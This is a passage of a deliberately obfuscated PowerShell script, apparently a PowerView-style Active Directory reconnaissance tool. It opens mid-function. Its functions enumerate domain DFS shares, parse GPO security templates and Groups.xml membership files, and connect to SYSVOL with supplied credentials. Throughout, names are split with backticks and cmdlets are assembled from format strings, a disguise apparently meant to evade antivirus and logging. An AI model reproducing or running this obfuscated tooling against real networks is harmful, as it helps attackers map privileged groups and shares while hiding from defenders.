                        ${ComME`Nt_S`I`Z`e`_end} = ${ComM`E`Nt_`S`iZE_sTArt} + 1
                        ${co`M`MEn`T_S`ize} =   $SqPY8::"t`ou`iNt16"(${B`LoB_d`ATA}[${CoM`MENt_SIZe_S`TA`RT}..${c`omMEnT_`s`iZe_end}],0)
                        ${C`o`M`meN`T_sTArt} = ${COmmEnt`_`Si`Ze_eNd} + 1
                        ${cOM`MEN`T_eNd} = ${cO`MM`E`NT_start} + ${cOMme`NT_S`I`ZE} - 1
                        if (${C`OMM`ent`_Size} -gt 0)  {
                            ${c`o`MMEnT} =  $ie9Q::"uniC`o`dE"."geTSt`R`ing"(${B`Lob_`dA`TA}[${c`O`mmeN`T_stART}..${c`o`mMenT_END}])
                        }
                        ${p`ReFix`_T`I`mEST`AMp_sTArt} = ${CoM`Me`Nt_`eND} + 1
                        ${P`ReF`IX_`Tim`ESTa`MP_END} = ${p`Re`FIX_tIM`esta`mp_sTART} + 7
                        
                        ${PREfIx_`T`Im`e`staMp} = ${blO`B`_DaTa}[${PRe`FI`x_ti`MeStAMp_S`TaRt}..${P`R`E`F`I`X_TIm`eStAmP_End}] 
                        ${STate_`TIMESTAM`p`_`STArT} = ${PrEFi`x_TImE`sT`AMP_ENd} + 1
                        ${St`ATe`_Ti`MesT`AmP`_END} = ${STat`E_Ti`meStaMP_ST`ArT} + 7
                        ${ST`AT`e`_TImeSTamP} = ${Blo`B_D`A`TA}[${StAtE_`TImEst`Am`P_ST`ARt}..${sTatE`_TI`MeS`TAmP`_eNd}]
                        ${co`MME`NT_tIMesTa`mP_StA`Rt} = ${sTATE_`TIMeS`T`Amp`_`e`ND} + 1
                        ${COM`meNt_tim`eSTAm`p`_End} = ${CoMMEnt_t`I`ME`STA`MP_staRT} + 7
                        ${comM`eNt`_`TIMES`TaMP} = ${Bl`OB_`dATA}[${COMmeNt`_tI`Me`stam`p`_sTArT}..${cOMme`Nt_TI`ME`ST`AmP_e`ND}]
                        ${V`ErsiOn_ST`A`Rt} = ${com`MEn`T_t`imEStamP_e`ND}  + 1
                        ${VER`Si`on`_eND} = ${v`erSIoN`_st`ArT} + 3
                        ${vER`sI`on} =  (GET-VaRiabLE  sQpY8).VAlue::"To`U`int32"(${BlO`B_d`Ata}[${ve`RSI`on_StArT}..${Vers`ION_E`ND}],0)

                        
                        ${dF`s`_Ta`RgeT`L`Is`T_BLOb_si`Ze`_STa`Rt} = ${VE`Rsi`on_E`ND} + 1
                        ${DFS`_tA`RGEtLisT`_bLob_sIZE`_eND} = ${dFs`_ta`R`gEtlIsT_B`loB_sIZe_stA`RT} + 3
                        ${D`F`s_tA`Rge`TLis`T_bLOb_Si`ZE} =   (  iTeM ('va'+'RIABlE:S'+'qpY8')  ).vALUe::"to`Ui`Nt32"(${b`loB`_DA`TA}[${d`FS`_`TArget`l`iST`_BLob_S`Ize_sTArT}..${DF`S_t`Ar`g`et`lIsT_`B`LOB_SIZE_`enD}],0)

                        ${DF`S_TarGeTL`iS`T`_`BlOb_S`T`ART} = ${Dfs_T`Arg`Et`LIst`_`BL`oB_`SiZe_eND} + 1
                        ${dFS_`T`ArG`EtLis`T`_`BloB_end} = ${dfs`_taRG`Etlis`T_bL`Ob`_`S`Ta`RT} + ${d`FS_tAR`ge`T`LIst_bL`oB_`sI`ZE} - 1
                        ${D`F`s`_TARGE`TL`ist_B`lOB} = ${bL`O`B`_dATA}[${D`FS_`TA`RgEtlis`T`_blo`B_STA`RT}..${Df`S_`TaRGet`l`iS`T_blOB_E`Nd}]
                        ${rE`SeRVEd`_bLoB_Si`Ze`_STArT} = ${d`Fs_t`ARgETLiS`T`_`BloB_`EnD} + 1
                        ${rEServE`D`_bLOB_`siZE_`e`Nd} = ${RE`se`RVE`D_`BlOB_`sIZE_s`Ta`Rt} + 3
                        ${ReSerVEd`_`Bl`Ob_`size} =  (ITEM vArIaBLe:sqPY8).value::"tO`U`iNT32"(${BLo`B_D`ATa}[${reseR`VED_bl`ob`_`Si`zE_sTart}..${RE`Se`R`VED_bLob`_SI`ZE`_END}],0)

                        ${reS`ERvE`D`_bLo`B_staRt} = ${REservED_B`l`O`B`_s`Iz`E`_eNd} + 1
                        ${Re`serv`E`D_bLOb_`ENd} = ${rE`s`ErvEd_`BLO`B_`StarT} + ${rEsE`RvED_b`lO`B_S`IZe} - 1
                        ${rE`Serve`D`_Bl`OB} = ${b`l`oB_DaTA}[${ResER`V`eD`_b`loB_START}..${RE`sERvE`D_`BlOB_end}]
                        ${R`eFErra`l_`Ttl_Sta`RT} = ${RE`seRv`e`d_bL`oB_ENd} + 1
                        ${R`eFERRal_`Tt`L`_`EnD} = ${reF`erra`l_T`TL_s`TArT} + 3
                        ${R`EF`E`Rra`L_TtL} =  ( VarIaBlE sQpy8 -VAlUEonly )::"ToUI`N`T32"(${b`l`ob_Da`TA}[${rEFErRaL`_`Tt`l`_S`TarT}..${RE`Fe`RrAl_`TTL`_eNd}],0)

                        
                        ${TaRgE`T_c`oUn`T`_sTART} = 0
                        ${t`ArGET_C`O`UnT_End} = ${TAR`GE`T_`COUNt_ST`ArT} + 3
                        ${tA`R`G`et_CoUNT} =   (GEt-vARiAble  SQpy8  -Val)::"TOUIn`T`32"(${dF`s_`TaRGetLi`St_blOB}[${TaRGet_`coU`NT_`sT`ARt}..${tARGE`T_COUN`T`_End}],0)
                        ${T`_OFfS`Et} = ${taRGe`T_COuNt_`e`Nd} + 1

                        for(${J}=1; ${j} -le ${Targ`eT`_CounT}; ${J}++){
                            ${Targ`et`_`entRY`_SIZE_start} = ${T`_o`FFs`Et}
                            ${tar`geT_eN`Tr`y_s`ize_e`ND} = ${TArgE`T_En`TrY`_s`I`ze_`st`ART} + 3
                            ${ta`RGe`T_E`Ntry_siZe} =  $sQPy8::"T`ouI`NT32"(${dFs_targe`T`LIst_Bl`Ob}[${tAR`g`Et_eN`Try_s`I`zE_STaRt}..${tAR`g`et`_ENTrY`_sIz`E_end}],0)
                            ${taRge`T`_`TIMe_sTAmp`_st`ART} = ${TaRGe`T_e`NtRY_s`IZE`_EnD} + 1
                            ${TARgET`_`Ti`me_sTam`p_`ENd} = ${target_tIm`e_st`AMP`_`STaRT} + 7
                            
                            ${TAr`GET_tI`M`e_StamP} = ${D`F`s_TAr`G`EtLiSt`_`BloB}[${taR`GET_T`iM`e_S`T`A`M`P_starT}..${T`ARG`Et_t`iM`E_STAMP_`E`ND}]
                            ${tAR`GeT_STAte`_s`T`ARt} = ${T`AR`g`eT_TiM`e_`StaM`p_eND} + 1
                            ${TArgEt`_`ST`Ate_e`ND} = ${tA`R`get`_StAtE_`ST`ART} + 3
                            ${T`ARGet_`stAte} =  (  GeT-vARiABLE sqPy8 ).vALUE::"toUI`N`T32"(${dfs_TA`R`gE`T`liSt_`Blob}[${TArGeT_ST`ATE_`s`T`A`Rt}..${targ`eT_sTAT`e`_e`ND}],0)

                            ${T`Arg`e`T_tYpe_ST`ArT} = ${TaRGEt_sTaT`E_`E`Nd} + 1
                            ${TaR`G`Et_tyPe`_E`Nd} = ${tAr`GET_`TYPE_stA`Rt} + 3
                            ${ta`RGEt_t`YPE} =  (  lS  ("va"+"RIABlE:S"+"q"+"py8")  ).vAluE::"toUINT`32"(${dfs_tA`R`GetlIST_`BL`Ob}[${t`ARGet`_tyPe_`sTart}..${tAR`g`et_TY`pe_end}],0)

                            ${sE`RvEr_n`Am`e_`sIz`e_`START} = ${TaRG`E`T_tY`pe_eND} + 1
                            ${seRV`er_`NamE_SIzE`_`e`Nd} = ${SE`RVER_N`A`Me_SI`ze_S`T`ART} + 1
                            ${seRve`R`_n`AME_SiZE} =   $SQpY8::"TOUI`N`T16"(${dF`s_T`ArgET`l`ist_`Bl`OB}[${sErVer`_n`AMe_`sIze_stA`RT}..${SErVEr_`N`AmE`_SIz`e_`EnD}],0)

                            ${s`eRvER_Na`mE`_sTaRt} = ${sEr`VeR_NaMe_`S`iZe`_eNd} + 1
                            ${s`ErvEr_nam`E`_End} = ${S`ERve`R_nAmE`_S`TarT} + ${sERv`Er_n`AMe`_SIzE} - 1
                            ${S`ERVEr`_na`Me} =   $iE9Q::"UNICo`DE"."gEt`STR`ing"(${Dfs_`Tar`getlI`sT`_bLoB}[${s`e`R`VER_NaME_`StARt}..${ser`VEr`_NA`m`E_E`ND}])

                            ${ShAR`e_Name_siZe_`stA`RT} = ${SERV`E`R_nAME`_ENd} + 1
                            ${sHaRe_`NaMe_`Siz`E_ENd} = ${SHar`e_na`me_s`i`zE`_ST`ART} + 1
                            ${shAre_`N`AM`E`_siZE} =   (Get-CHILdItEm  ('vaRiAbLE:S'+'Q'+'pY'+'8') ).VALuE::"to`UINt16"(${dfs`_tArgETli`sT`_`BlOb}[${SH`A`RE`_NA`me`_size_st`Art}..${S`h`Are_`NAmE`_S`iZE_eND}],0)
                            ${S`Ha`RE_name_S`TART} = ${SHAre_`NaMe`_SIze`_end} + 1
                            ${ShAr`e`_nA`ME_e`ND} = ${SHa`Re`_Na`mE_`STaRT} + ${SH`AR`e_`NamE_SIze} - 1
                            ${SH`A`RE_`NaME} =  $IE9Q::"Un`IC`oDe"."GEtSt`Ri`Ng"(${Df`s_`TARget`lIst`_blob}[${S`HARE_N`AM`e_s`TarT}..${ShAr`E_nAME_`end}])

                            ${T`A`RGEt_`lisT} += "\\$server_name\$share_name"
                            ${T_`O`FfseT} = ${share_`N`A`Me_`EnD} + 1
                        }
                    }
                }
                ${OF`FSET} = ${b`L`O`B_DAta_eNd} + 1
                ${d`FS`_Pk`T`_pR`OpErt`iES} = @{
                    ("{1}{0}"-f 'me','Na') = ${b`LOb`_Name}
                    ("{1}{0}"-f 'x','Prefi') = ${Pr`EFiX}
                    ("{2}{0}{1}"-f 'etLi','st','Targ') = ${tA`R`geT`_List}
                }
                ${o`BjeC`T_l`isT} += &("{0}{1}{2}" -f'Ne','w-Objec','t') -TypeName ("{1}{2}{0}" -f 'ct','PSObj','e') -Property ${DFs_`pkt_`Pro`p`ERties}
                ${PRe`F`IX} = ${N`Ull}
                ${b`L`ob_NAmE} = ${n`UlL}
                ${TargE`T`_LIst} = ${N`ULL}
            }

            ${Se`RVE`RS} = @()
            ${O`BJEct_`l`isT} | &("{3}{4}{1}{2}{0}" -f 'ct','h-','Obje','For','Eac') {
                if (${_}."TA`RGE`TLISt") {
                    ${_}."tarGeTL`i`st" | &("{3}{0}{1}{2}"-f 'rEach','-Objec','t','Fo') {
                        ${SERV`ERs} += ${_}.("{1}{0}"-f 'plit','s').Invoke('\')[2]
                    }
                }
            }

            ${sERve`RS}
        }

        function ge`T-`domAIN`DfSs`hA`Re`V1 {
            [CmdletBinding()]
            Param(
                [String]
                ${do`M`AIn},

                [String]
                ${sEaRch`Ba`SE},

                [String]
                ${seR`V`er},

                [String]
                ${s`eaRcHsc`O`pe} = ("{1}{0}" -f'btree','Su'),

                [Int]
                ${REs`ULtP`A`GEsiZE} = 200,

                [Int]
                ${se`Rver`TImE`LiMIT},

                [Switch]
                ${t`ombsT`OnE},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${c`REDeNT`i`AL} =   $0dsQr::"EMP`TY"
            )

            ${d`FsS`E`ARCheR} = &("{4}{5}{2}{3}{0}{1}" -f'e','archer','-Doma','inS','G','et') @PSBoundParameters

            if (${dfssE`A`R`CHER}) {
                ${DFS`ShaR`Es} = @()
                ${D`FsSea`Rch`Er}."f`IL`Ter" = ((("{2}{0}{4}{3}{1}"-f'ob','fs))','(&(','ectClass=fTD','j')))

                try {
                    ${REsu`LTS} = ${DfS`s`EarcHer}.("{0}{2}{1}"-f'Fin','All','d').Invoke()
                    ${r`eSuL`Ts} | &("{1}{0}{2}" -f'j','Where-Ob','ect') {${_}} | &("{3}{1}{0}{2}"-f 'ch-Ob','a','ject','ForE') {
                        ${p`RoPERt`i`eS} = ${_}."Pro`pEr`T`iES"
                        ${RE`MOTENA`M`eS} = ${PROpe`R`T`IEs}."r`emo`T`ESeRvERnAmE"
                        ${P`Kt} = ${p`ROPerT`i`es}."p`kT"

                        ${dfs`s`haR`es} += ${REMOT`e`Nam`ES} | &("{1}{3}{0}{2}"-f 'c','ForEach-','t','Obje') {
                            try {
                                if ( ${_}.("{2}{1}{0}" -f 'tains','on','C').Invoke('\') ) {
                                    &("{2}{1}{3}{0}"-f 'ct','Obj','New-','e') -TypeName ("{2}{0}{1}"-f 'bjec','t','PSO') -Property @{("{0}{1}"-f 'Nam','e')=${Prop`eRtI`eS}."nA`me"[0];("{2}{1}{4}{0}{3}"-f'rNam','moteSe','Re','e','rve')=${_}.("{1}{0}"-f'lit','sp').Invoke('\')[2]}
                                }
                            }
                            catch {
                                &("{3}{0}{2}{1}"-f'te-Ve','se','rbo','Wri') ('['+'Get-Do'+'ma'+'inD'+'F'+'SShare]'+' '+'Get-Do'+'ma'+'inDF'+'S'+'Shar'+'eV1 '+'e'+'rror '+'i'+'n '+'pa'+'r'+'sing '+'DFS'+' '+'shar'+'e '+': '+"$_")
                            }
                        }
                    }
                    if (${r`eSults}) {
                        try { ${r`es`UlTs}.("{1}{0}" -f'ose','disp').Invoke() }
                        catch {
                            &("{1}{2}{0}{3}" -f 'e','Write','-V','rbose') ('[G'+'e'+'t'+'-Domai'+'nD'+'FSShar'+'e] '+'Get-Domai'+'nDF'+'S'+'Share'+'V1 '+'e'+'rror '+'d'+'is'+'po'+'sing '+'o'+'f '+'th'+'e '+'R'+'esults'+' '+'obj'+'ect: '+"$_")
                        }
                    }
                    ${DF`SsE`Arc`heR}.("{1}{0}{2}"-f 'spo','di','se').Invoke()

                    if (${p`KT} -and ${P`Kt}[0]) {
                        &("{1}{0}{2}"-f'rse-Pk','Pa','t') ${p`Kt}[0] | &("{1}{2}{3}{0}{4}"-f'ach-Ob','F','or','E','ject') {
                            
                            
                            
                            if (${_} -ne ("{0}{1}" -f 'n','ull')) {
                                &("{3}{2}{0}{1}" -f'Obje','ct','ew-','N') -TypeName ("{1}{0}" -f'ct','PSObje') -Property @{("{1}{0}"-f 'e','Nam')=${PROpE`R`TIES}."nA`ME"[0];("{1}{3}{2}{0}"-f 'ame','Rem','verN','oteSer')=${_}}
                            }
                        }
                    }
                }
                catch {
                    &("{2}{0}{1}"-f'-Warni','ng','Write') ('[Ge'+'t-DomainDF'+'SSha'+'re'+'] '+'Get-Do'+'mainDFS'+'Share'+'V1 '+'err'+'or '+': '+"$_")
                }
                ${dFs`Sha`RES} | &("{3}{1}{0}{2}" -f'-Obje','t','ct','Sor') -Unique -Property ("{0}{3}{2}{1}"-f'Remot','erName','v','eSer')
            }
        }

        function GEt-dOmAINDf`SSH`A`RE`V2 {
            [CmdletBinding()]
            Param(
                [String]
                ${do`M`AIn},

                [String]
                ${S`Ea`R`CHBASE},

                [String]
                ${s`e`RvEr},

                [String]
                ${s`E`A`RcHscOpe} = ("{1}{0}"-f 'e','Subtre'),

                [Int]
                ${ReS`Ul`T`pAGE`sIZE} = 200,

                [Int]
                ${SERVE`RTI`me`Li`MIt},

                [Switch]
                ${toM`BsTo`NE},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${Cred`ENTI`AL} =  (  VARIABLE  0DSQR  ).VALue::"EmP`Ty"
            )

            ${d`F`ssea`RcHer} = &("{1}{0}{3}{4}{2}" -f 'nSe','Get-Domai','er','a','rch') @PSBoundParameters

            if (${dFS`sE`A`RCheR}) {
                ${DfSsHa`R`ES} = @()
                ${dfSS`E`A`RchER}."FI`LtEr" = ("{1}{8}{3}{6}{4}{5}{2}{0}{7}"-f'inkv','(&(o','msDFS-L','e','Cla','ss=','ct','2))','bj')
                ${Nu`LL} = ${dF`S`SeA`Rcher}."prO`p`ErtIesToLO`Ad".("{1}{2}{0}" -f'e','AddRan','g').Invoke((("{3}{2}{0}{1}"-f 'pa','thv2','nk','msdfs-li'),("{4}{1}{3}{5}{2}{0}"-f'stv2','DFS-Ta','Li','rge','ms','t')))

                try {
                    ${r`ESu`Lts} = ${dFssE`Ar`CheR}.("{0}{1}"-f 'Fi','ndAll').Invoke()
                    ${r`ESUl`Ts} | &("{2}{3}{0}{1}" -f'e-Ob','ject','W','her') {${_}} | &("{1}{3}{0}{2}{4}" -f'h-','F','Obj','orEac','ect') {
                        ${p`R`OP`eRTies} = ${_}."PRO`Pe`RtieS"
                        ${TargeT_L`I`st} = ${Pr`oPE`RtIes}.'msdfs-targetlistv2'[0]
                        ${x`Ml} = [xml]  (  vARiablE ('iE'+'9Q')  ).vALUE::"uN`iC`ODE"."gE`TsTRI`NG"(${tA`R`get_`lISt}[2..(${TA`RgET`_list}."l`eN`GTh"-1)])
                        ${dF`sSH`A`REs} += ${X`mL}."TAr`Ge`TS"."cH`ILdn`oD`Es" | &("{1}{0}{3}{2}" -f'ch-Obj','ForEa','t','ec') {
                            try {
                                ${tA`RgeT} = ${_}."i`NNe`RtE`xt"
                                if ( ${T`Arget}.("{1}{0}{2}" -f 'in','Conta','s').Invoke('\') ) {
                                    ${DfSr`OOT} = ${taR`g`et}.("{1}{0}"-f'lit','sp').Invoke('\')[3]
                                    ${ShA`R`ENAMe} = ${pro`PERTI`Es}.'msdfs-linkpathv2'[0]
                                    &("{0}{1}{2}"-f 'Ne','w-Ob','ject') -TypeName ("{2}{1}{0}" -f'bject','O','PS') -Property @{("{1}{0}"-f 'ame','N')="$DFSroot$ShareName";("{2}{3}{5}{0}{1}{4}" -f'r','Nam','Remo','teSer','e','ve')=${TAR`g`ET}.("{1}{0}"-f 'plit','s').Invoke('\')[2]}
                                }
                            }
                            catch {
                                &("{1}{0}{2}"-f'ite-V','Wr','erbose') ('[G'+'e'+'t-Do'+'mai'+'nD'+'FSShare'+'] '+'Ge'+'t-Doma'+'in'+'DFSSh'+'a'+'reV2 '+'error'+' '+'i'+'n '+'pars'+'ing'+' '+'target'+' '+': '+"$_")
                            }
                        }
                    }
                    if (${rEsu`LTS}) {
                        try { ${resU`lTs}.("{2}{1}{0}"-f'ose','p','dis').Invoke() }
                        catch {
                            &("{1}{0}{2}{3}" -f 'te-Ve','Wri','r','bose') ('[Get-'+'Dom'+'ain'+'DFSSh'+'a'+'r'+'e] '+'E'+'rror '+'d'+'is'+'posing '+'of'+' '+'the'+' '+'R'+'e'+'sults '+'ob'+'je'+'ct: '+"$_")
                        }
                    }
                    ${dfssE`ARC`h`er}.("{1}{0}{2}" -f 'ispos','d','e').Invoke()
                }
                catch {
                    &("{3}{4}{2}{0}{1}" -f'te-W','arning','i','W','r') ('[Get-D'+'oma'+'i'+'n'+'DFS'+'Share'+'] '+'Get-Do'+'mainD'+'FS'+'ShareV'+'2'+' '+'err'+'or '+': '+"$_")
                }
                ${d`Fs`sH`ArES} | &("{2}{1}{0}"-f't','rt-Objec','So') -Unique -Property ("{0}{3}{2}{4}{1}" -f 'Remote','e','rN','Serve','am')
            }
        }
    }

    PROCESS {
        ${d`FsShar`eS} = @()

        if (${P`sboUnd`PaRAMete`RS}[("{1}{0}"-f'omain','D')]) {
            ForEach (${T`ARge`Tdo`MaIN} in ${d`Om`AIn}) {
                ${se`ARC`HER`ARGuME`N`Ts}[("{0}{1}"-f 'Dom','ain')] = ${tAR`Ge`T`DOM`AIN}
                if (${ve`RS`iOn} -match ((("{0}{1}"-f 'all','va71'))-cREpLaCe ([cHar]118+[cHar]97+[cHar]55),[cHar]124)) {
                    ${df`SShAR`ES} += &("{0}{1}{3}{4}{2}"-f 'Ge','t-','V1','DomainD','FSShare') @SearcherArguments
                }
                if (${V`er`sIoN} -match ((("{0}{1}{2}" -f'a','ll{0}','2'))  -F[ChAr]124)) {
                    ${df`sSHar`eS} += &("{1}{0}{3}{2}{5}{4}" -f 'n','Get-Domai','Sha','DFS','V2','re') @SearcherArguments
                }
            }
        }
        else {
            if (${v`ER`Sion} -match ((("{0}{1}{2}"-f'all1','h','E1'))."r`ePlA`Ce"(([chAR]49+[chAR]104+[chAR]69),'|'))) {
                ${dFS`Sha`ReS} += &("{1}{3}{2}{0}"-f 'omainDFSShareV1','Get','D','-') @SearcherArguments
            }
            if (${vE`RSi`oN} -match ((("{2}{0}{1}"-f '}','2','all{0'))-f [chaR]124)) {
                ${d`FsS`hAREs} += &("{0}{1}{2}{3}{4}" -f 'Get-Dom','a','i','n','DFSShareV2') @SearcherArguments
            }
        }

        ${D`FsSH`Ares} | &("{1}{2}{0}" -f 'ect','Sort-Ob','j') -Property (("{2}{4}{3}{0}{1}"-f'rver','Name','Remot','Se','e'),("{1}{0}"-f'ame','N')) -Unique
    }
}








function g`Et`-GPTT`MpL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}" -f's','PSShouldProc','s','e'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(MANdatOrY = ${t`Rue}, vaLueFrOmPIPEline = ${t`Rue}, VAluEfROmpiPElINebYpROPerTynAme = ${T`RUe})]
        [Alias({"{1}{3}{2}{0}"-f 'path','gpcfil','ys','es'}, {"{1}{0}"-f'h','Pat'})]
        [String]
        ${G`P`TtmP`lpATh},

        [Switch]
        ${OutPUT`OB`jE`cT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`De`NtI`AL} =  $0DsQR::"em`PtY"
    )

    BEGIN {
        ${map`peDPa`ThS} = @{}
    }

    PROCESS {
        try {
            if ((${gp`TtMplp`ATh} -Match ((("{0}{2}{1}{3}"-f 'GtjGtj','Gtj.*GtjGtj.','Gtj','*'))."RE`pLaCe"(([cHAr]71+[cHAr]116+[cHAr]106),[StRing][cHAr]92))) -and (${PsBouN`dp`Ar`AMeTe`Rs}[("{1}{0}{2}" -f 'ent','Cred','ial')])) {
                ${sysVo`Lp`AtH} = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL "
                if (-not ${MaPp`Edp`ATHS}[${syS`Volpa`TH}]) {
                    
                    &("{1}{0}{2}{4}{5}{3}"-f'd','Ad','-R','ection','emoteCon','n') -Path ${S`ys`V`OLPATh} -Credential ${cRe`D`e`NTIaL}
                    ${M`A`pPeD`PaThs}[${Sys`VoLPa`Th}] = ${t`Rue}
                }
            }

            ${t`ARgeT`GP`TtmPLpATH} = ${gp`Tt`mpl`patH}
            if (-not ${TAr`Get`gpttm`p`LPATh}.("{1}{2}{0}" -f 'h','EndsWi','t').Invoke(("{0}{1}" -f '.in','f'))) {
                ${TarGe`Tg`P`TtmPL`PAth} += ((("{18}{8}{13}{6}{14}{7}{17}{9}{12}{10}{16}{3}{15}{0}{1}{2}{11}{4}{5}" -f 'dit','O','F','Sec','i','nf','CHINE','Fe','e','oftO','Windows N','eGptTmpl.','Fe','MA','O','E','TOFe','Micros','OF'))."RE`P`LaCe"('OFe',[sTRING][ChaR]92))
            }

            &("{0}{2}{3}{1}" -f 'Writ','se','e','-Verbo') ('[G'+'et-G'+'p'+'tTmpl] '+'Parsi'+'n'+'g '+'GptTmplPath'+':'+' '+"$TargetGptTmplPath")

            if (${PsBo`U`NdPaR`AME`TeRs}[("{3}{1}{2}{0}"-f 'ject','u','tputOb','O')]) {
                ${con`Ten`Ts} = &("{0}{1}{2}"-f 'Get-IniCo','n','tent') -Path ${t`Arg`etgpt`TMPlpA`Th} -OutputObject -ErrorAction ("{1}{0}"-f 'top','S')
                if (${ConT`ENTS}) {
                    ${CONTe`N`Ts} | &("{2}{3}{1}{0}" -f'ber','-Mem','Ad','d') ("{3}{2}{1}{0}"-f 'roperty','tep','o','N') ("{1}{0}"-f 'ath','P') ${T`A`RGEt`GpTTMp`lPath}
                    ${CO`NTEN`Ts}
                }
            }
            else {
                ${co`NTe`NTS} = &("{0}{3}{2}{1}" -f'Ge','ntent','o','t-IniC') -Path ${ta`R`ge`TGPTt`mPlPaTH} -ErrorAction ("{1}{0}"-f'top','S')
                if (${coNTE`N`TS}) {
                    ${CO`NTE`N`TS}[("{0}{1}" -f 'Pa','th')] = ${tArG`e`TgP`T`TmPlpAtH}
                    ${CONt`e`NTS}
                }
            }
        }
        catch {
            &("{1}{0}{4}{3}{2}" -f'e','Writ','e','rbos','-Ve') ('[G'+'et-'+'G'+'ptTmpl]'+' '+'Erro'+'r'+' '+'p'+'ar'+'sing '+"$TargetGptTmplPath "+': '+"$_")
        }
    }

    END {
        
        ${Ma`ppeDP`AT`hS}."k`eys" | &("{3}{1}{0}{2}" -f'ach','rE','-Object','Fo') { &("{1}{4}{5}{2}{0}{3}{6}" -f'ot','Rem','m','eCo','ove-','Re','nnection') -Path ${_} }
    }
}


function G`ET-`gro`UPs`XmL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}{4}"-f 'P','SShou','P','ld','rocess'}, '')]
    [OutputType({"{4}{1}{0}{2}{3}"-f 'erView.','w','Group','sXML','Po'})]
    [CmdletBinding()]
    Param (
        [Parameter(MaNdatOry = ${Tr`Ue}, vaLUefroMPIPELINe = ${t`Rue}, valueFrOmpIpEliNeBYprOpERTynAme = ${t`Rue})]
        [Alias({"{0}{1}"-f 'P','ath'})]
        [String]
        ${grOup`s`XM`Lp`Ath},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`EdeNT`i`Al} =   $0DSQr::"eM`ptY"
    )

    BEGIN {
        ${ma`p`PEDp`AthS} = @{}
    }

    PROCESS {
        try {
            if ((${g`RouPSxmLP`A`Th} -Match ((("{4}{1}{3}{0}{6}{2}{5}" -f'{0}.','}{0','{0}','}','{0}{0','.*','*{0}'))  -F[ChaR]92)) -and (${PS`BOUN`DP`ARam`ETers}[("{2}{1}{0}" -f 'ntial','e','Cred')])) {
                ${s`YsvoL`pA`Th} = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL "
                if (-not ${M`APPedp`At`HS}[${s`YsvO`LPATH}]) {
                    
                    &("{5}{3}{0}{4}{1}{2}"-f'eConn','c','tion','-Remot','e','Add') -Path ${sY`SVOlp`ATH} -Credential ${c`REDe`NTial}
                    ${mapPED`pAT`hs}[${SySVOl`p`Ath}] = ${TR`UE}
                }
            }

            [XML]${gr`OUpSxml`cO`N`TeNt} = &("{1}{2}{0}"-f 'ent','Get-Con','t') -Path ${gR`o`UpsxMl`PA`TH} -ErrorAction ("{0}{1}" -f 'Sto','p')

            
            ${gr`oUp`SxMLc`oNT`ENT} | &("{0}{3}{1}{2}"-f 'Se','-','Xml','lect') ("{1}{0}{3}{2}"-f 'Grou','/','up','ps/Gro') | &("{0}{3}{1}{2}"-f'Select','e','ct','-Obj') -ExpandProperty ("{0}{1}"-f'nod','e') | &("{3}{1}{0}{2}"-f 'j','ach-Ob','ect','ForE') {

                ${G`Rou`pnAME} = ${_}."P`ROpER`TIEs"."Gr`ouPnA`Me"

                
                ${grOUps`iD} = ${_}."P`ROPE`RtieS"."gRo`U`PsID"
                if (-not ${G`ROUps`iD}) {
                    if (${gro`UPNA`mE} -match ("{1}{2}{3}{0}" -f 's','A','dmi','nistrator')) {
                        ${gROU`PS`Id} = ("{2}{1}{0}{3}"-f'54','-','S-1-5-32','4')
                    }
                    elseif (${GRo`UPn`AmE} -match ("{0}{2}{1}" -f 'Remote ','sktop','De')) {
                        ${gR`Ou`Psid} = ("{1}{0}{2}"-f'2','S-1-5-3','-555')
                    }
                    elseif (${G`ROUPnA`ME} -match ("{0}{2}{1}" -f 'Gu','ts','es')) {
                        ${G`ROU`P`sId} = ("{2}{0}{1}"-f '-3','2-546','S-1-5')
                    }
                    else {
                        if (${PS`B`oUndPaR`A`meTERs}[("{1}{0}{2}"-f'i','Credent','al')]) {
                            ${G`R`o`UpSid} = &("{0}{1}{2}{3}"-f'Co','nver','tT','o-SID') -ObjectName ${GRoupN`A`Me} -Credential ${c`RE`dentiAl}
                        }
                        else {
                            ${gro`U`PSid} = &("{2}{3}{1}{4}{0}" -f'D','o-','Convert','T','SI') -ObjectName ${Gro`U`PN`AME}
                        }
                    }
                }

                
                ${mEM`Bers} = ${_}."PROPE`RT`Ies"."mE`m`BErS" | &("{1}{3}{0}{2}" -f 'O','Sele','bject','ct-') -ExpandProperty ("{1}{2}{0}" -f'ber','Me','m') | &("{2}{1}{0}"-f 'ect','bj','Where-O') { ${_}."aC`TI`oN" -match 'ADD' } | &("{3}{1}{2}{0}"-f't','ach','-Objec','ForE') {
                    if (${_}."s`iD") { ${_}."s`Id" }
                    else { ${_}."n`AME" }
                }

                if (${M`EmBe`RS}) {
                    
                    if (${_}."Fi`Lt`eRs") {
                        ${FI`ltE`Rs} = ${_}."fi`LteRs".("{0}{2}{1}"-f'Get','numerator','E').Invoke() | &("{1}{0}{2}{3}" -f 'E','For','ach-Objec','t') {
                            &("{1}{0}{3}{2}"-f 'ew-','N','ject','Ob') -TypeName ("{2}{1}{0}" -f 'bject','SO','P') -Property @{("{0}{1}" -f'Typ','e') = ${_}."LOc`AlN`A`me";("{0}{1}"-f 'Valu','e') = ${_}."n`AME"}
                        }
                    }
                    else {
                        ${fi`l`TErS} = ${NU`Ll}
                    }

                    if (${ME`mb`ers} -isnot [System.Array]) { ${meMB`Ers} = @(${mEmBe`RS}) }

                    ${gR`oupS`XML} = &("{1}{2}{3}{0}" -f'bject','Ne','w-','O') ("{1}{2}{0}"-f 't','PSOb','jec')
                    ${Gr`oUpSX`mL} | &("{0}{2}{1}" -f 'Ad','ember','d-M') ("{3}{2}{1}{0}"-f 'roperty','p','ote','N') ("{1}{2}{0}" -f 'Path','GP','O') ${ta`RGe`Tg`ROUPSxMlpATH}
                    ${gR`Ou`PSxMl} | &("{3}{2}{0}{1}"-f'e','r','Memb','Add-') ("{2}{0}{1}"-f 'teprop','erty','No') ("{0}{1}"-f 'F','ilters') ${fiLT`E`Rs}
